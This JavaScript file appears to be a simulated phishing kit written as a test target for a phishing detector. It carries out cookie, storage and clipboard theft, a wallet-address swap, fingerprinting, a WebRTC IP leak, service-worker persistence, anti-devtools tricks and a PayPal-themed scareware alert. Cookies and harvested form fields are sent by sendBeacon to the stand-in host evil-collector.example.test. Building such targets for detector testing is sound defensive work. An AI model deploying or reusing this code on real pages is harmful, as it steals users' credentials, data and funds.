// Safe-lab evil-twin: a controlled simulation of an advanced phishing kit.
// Exercises every malicious behavior real-world kits do, so we can validate
// our safe-lab detector against a reproducible target.
//
// Nothing here actually steals anything — our safe-lab Chromium intercepts
// every dangerous API call before it executes. This file just announces the
// intent so the detector can record it.

(function () {
  const stamp = () => new Date().toISOString().slice(11, 19);
  const log = (msg) => console.log(`[evil-twin ${stamp()}] ${msg}`);
  log('phishing kit initializing...');

  // --- 1) Camera + microphone (fake "video ID verification") ---
  try {
    if (navigator.mediaDevices) {
      navigator.mediaDevices
        .getUserMedia({ video: true, audio: true })
        .then(() => log('media granted (would not happen in safe lab)'))
        .catch(() => log('media rejected'));
      navigator.mediaDevices.getDisplayMedia({ video: true }).catch(() => {});
    }
  } catch (_) {}

  // --- 2) Geolocation (fake "verify your country") ---
  try {
    navigator.geolocation.getCurrentPosition(
      () => {},
      () => {},
      { enableHighAccuracy: true }
    );
  } catch (_) {}

  // --- 3) Notifications (real kits use this to push fake "transaction alerts") ---
  try {
    if (window.Notification) Notification.requestPermission();
  } catch (_) {}

  // --- 4) Clipboard read (steal copied passwords, 2FA codes, wallet addresses) ---
  try {
    if (navigator.clipboard && navigator.clipboard.readText) {
      navigator.clipboard.readText().catch(() => {});
    }
  } catch (_) {}

  // --- 5) Clipboard write (crypto wallet address swap) ---
  try {
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard
        .writeText('bc1qattacker-wallet-address-fake-for-demo')
        .catch(() => {});
    }
  } catch (_) {}

  // --- 6) Service Worker registration (persistence — keeps phishing active
  //        even after the tab is closed, sends notifications later) ---
  try {
    if ('serviceWorker' in navigator) {
      navigator.serviceWorker
        .register('/safe-lab-demo/sw.js', { scope: '/' })
        .then(() => log('service worker registered'))
        .catch(() => {});
    }
  } catch (_) {}

  // --- 7) Push notification subscription (send fake alerts later) ---
  try {
    if ('PushManager' in window && navigator.serviceWorker) {
      navigator.serviceWorker.ready
        .then((reg) =>
          reg.pushManager.subscribe({
            userVisibleOnly: true,
            applicationServerKey: 'BFAKEKEYBFAKEKEYBFAKEKEY',
          })
        )
        .catch(() => {});
    }
  } catch (_) {}

  // --- 8) Cookie + localStorage theft (try to read existing site data) ---
  try {
    const stolen = {
      cookies: document.cookie || '',
      localStorage: JSON.stringify(Object.entries(localStorage || {})).slice(0, 500),
      sessionStorage: JSON.stringify(Object.entries(sessionStorage || {})).slice(0, 500),
    };
    log(`cookie/storage read: ${JSON.stringify(stolen).length} bytes`);
    // Try to exfiltrate via beacon (will be caught by network monitor)
    if (navigator.sendBeacon) {
      try {
        navigator.sendBeacon(
          'http://evil-collector.example.test/cookies',
          JSON.stringify(stolen)
        );
      } catch (_) {}
    }
  } catch (_) {}

  // --- 9) Browser fingerprinting (canvas + audio + screen + battery) ---
  try {
    // Canvas fingerprint
    const c = document.createElement('canvas');
    c.width = 200;
    c.height = 50;
    const ctx = c.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillStyle = '#f60';
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = '#069';
    ctx.fillText('fingerprint', 2, 15);
    const canvasFp = c.toDataURL().slice(0, 60);
    log(`canvas fingerprint: ${canvasFp.slice(0, 30)}...`);

    // Battery API (deprecated but still works in many browsers)
    if (navigator.getBattery) {
      navigator.getBattery().then((bat) => {
        log(`battery: level=${bat.level} charging=${bat.charging}`);
      }).catch(() => {});
    }
  } catch (_) {}

  // --- 10) WebRTC IP leak (reveals user's real IP behind VPN) ---
  try {
    if (window.RTCPeerConnection) {
      const pc = new RTCPeerConnection({
        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }],
      });
      pc.createDataChannel('');
      pc.createOffer().then((o) => pc.setLocalDescription(o)).catch(() => {});
      pc.onicecandidate = (e) => {
        if (e && e.candidate && e.candidate.candidate) {
          const m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
          if (m) log(`WebRTC leaked IP: ${m[1]}`);
        }
      };
    }
  } catch (_) {}

  // --- 11) Crypto wallet probe (check for MetaMask / wallet extensions) ---
  try {
    if (window.ethereum) {
      log('crypto wallet detected (MetaMask) — would request connection');
      // Real kits call .request({method:'eth_requestAccounts'}) to drain wallets
    }
  } catch (_) {}

  // --- 12) Auto-download (fake "verification document") ---
  try {
    const a = document.createElement('a');
    a.href = 'data:text/plain,Fake%20phishing%20payload%20(safe%20lab%20cancels%20this)';
    a.download = 'PayPal_account_verification.pdf';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
  } catch (_) {}

  // --- 13) Scareware popup (tech-support scam style) ---
  setTimeout(() => {
    try {
      alert('Critical Security Alert: Your PayPal account has been locked due to suspicious activity. Call +1-800-FAKE-PYP immediately.');
    } catch (_) {}
  }, 200);

  // --- 14) Disable right-click (anti-inspect) ---
  document.addEventListener('contextmenu', (e) => e.preventDefault());

  // --- 15) DevTools detection ---
  try {
    let devtoolsOpen = false;
    setInterval(() => {
      const t = performance.now();
      // eslint-disable-next-line no-debugger
      debugger;
      if (performance.now() - t > 100 && !devtoolsOpen) {
        devtoolsOpen = true;
        log('DEVTOOLS DETECTED — kit would now hide / redirect');
        // Real kits redirect to a benign page when devtools are detected
      }
    }, 1000);
  } catch (_) {}

  // --- 16) Override fetch to log all outbound POSTs (exfil monitoring) ---
  try {
    const origFetch = window.fetch;
    window.fetch = function (input, init) {
      if (init && (init.method || '').toUpperCase() === 'POST') {
        log(`POST exfil attempt: ${typeof input === 'string' ? input : input.url}`);
      }
      return origFetch.apply(this, arguments);
    };
  } catch (_) {}

  // --- Live countdown timer (urgency engineering) ---
  let secs = 14 * 60 + 59;
  const cd = document.getElementById('countdown');
  setInterval(() => {
    if (secs <= 0) return;
    secs--;
    const m = String(Math.floor(secs / 60)).padStart(2, '0');
    const s = String(secs % 60).padStart(2, '0');
    if (cd) cd.textContent = `${m}:${s}`;
  }, 1000);

  log('phishing kit initialization complete');
})();

// --- "Verify identity with selfie" — fired from a button tap so it works
//     even on iOS Safari (which silently blocks auto-fired media requests).
//     The user sees a real "site wants to use your camera" prompt; whatever
//     they pick, we've already proven the page tried. -----------------------
function askForCamera() {
  try {
    navigator.mediaDevices
      .getUserMedia({ video: { facingMode: 'user' }, audio: true })
      .then((stream) => {
        // Real kits would attach the stream to a hidden <video> and start
        // recording. We just stop the tracks immediately.
        stream.getTracks().forEach((t) => t.stop());
        alert('Verification complete — please continue with the form below.');
      })
      .catch(() => {
        alert('We could not access your camera. Please enable camera access and try again.');
      });
  } catch (e) {
    alert('Camera not available on this device.');
  }
}

// --- Form step advancement (multi-step credential harvesting) ---
function advanceStep(n) {
  document.querySelectorAll('.step').forEach((s) => s.classList.remove('active'));
  const next = document.getElementById('step' + n + 'form');
  if (next) next.classList.add('active');
  for (let i = 1; i <= 3; i++) {
    const dot = document.getElementById('dot' + i);
    if (!dot) continue;
    dot.classList.remove('active', 'done');
    if (i < n) dot.classList.add('done');
    else if (i === n) dot.classList.add('active');
  }
  // Submit the form data to the evil collector via sendBeacon between steps
  try {
    const formData = {};
    document.querySelectorAll('input').forEach((inp) => {
      if (inp.value) formData[inp.name || inp.id] = inp.value;
    });
    if (Object.keys(formData).length && navigator.sendBeacon) {
      navigator.sendBeacon(
        'http://evil-collector.example.test/progress',
        JSON.stringify(formData)
      );
    }
  } catch (_) {}
}
